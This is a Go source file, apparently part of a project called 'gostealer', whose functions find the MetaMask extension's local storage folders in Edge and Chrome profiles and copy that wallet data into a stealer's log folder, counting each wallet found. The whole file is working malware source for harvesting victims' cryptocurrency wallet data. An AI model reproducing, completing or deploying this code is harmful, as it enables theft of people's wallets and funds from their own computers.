package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyMetamaskEdge(browserPath, logFolderPath string) {
	metamaskc := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
	metamaske := path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")

	if _, err := os.Stat(metamaskc); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "metamask_edge_chromeversion\n"
	}
	if _, err := os.Stat(metamaske); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "metamask_edge\n"
	}
	// ____________________
	utils.CopyFolderFiles(metamaske, path.Join(logFolderPath, "wallets", "metamask_edge"))

	utils.CopyFolderFiles(metamaskc, path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"))
}

func CopyMetamaskChrome(browserPath, logFolderPath string) {
	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")

	if _, err := os.Stat(metamask); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "metamask_chrome\n"
	}
	//________________

	utils.CopyFolderFiles(metamask, path.Join(logFolderPath, "wallets", "metamask_chrome"))
}
